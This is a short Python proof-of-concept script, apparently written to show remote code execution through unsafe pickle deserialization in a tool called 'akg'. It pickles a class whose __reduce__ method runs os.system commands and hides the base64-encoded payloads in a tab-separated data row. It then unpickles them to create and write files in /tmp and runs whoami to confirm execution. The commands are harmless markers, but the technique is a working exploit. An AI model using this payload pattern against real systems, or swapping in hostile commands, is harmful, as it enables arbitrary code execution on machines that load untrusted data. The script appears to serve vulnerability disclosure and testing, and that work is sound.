import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (exec, ('import os; os.system("touch /tmp/akg_rce_proof")',))

t = base64.b64encode(pickle.dumps(Exploit())).decode()
c = base64.b64encode(pickle.dumps(Exploit())).decode()
r = base64.b64encode(pickle.dumps(Exploit())).decode()
row = f"cuda\t{t}\t{c}\t{r}"
items = row.split("\t")

print("[1] 三次pickle.loads")
pickle.loads(base64.b64decode(items[1].encode()))
pickle.loads(base64.b64decode(items[2].encode()))
pickle.loads(base64.b64decode(items[3].encode()))

print("[2] check file")
print(os.system("test -f /tmp/akg_rce_proof && echo '文件存在' || echo '文件不存在'"))

print("[3] files")
os.system("ls -la /tmp/akg_rce_proof")

print("[4] user")
os.system("whoami")

class WriteFile:
    def __reduce__(self):
        return (exec, ('import os; os.system("echo POC_SUCCESS > /tmp/akg_proof_content")',))

w = base64.b64encode(pickle.dumps(WriteFile())).decode()
pickle.loads(base64.b64decode(w.encode()))
print("[5] ver write")
os.system("cat /tmp/akg_proof_content")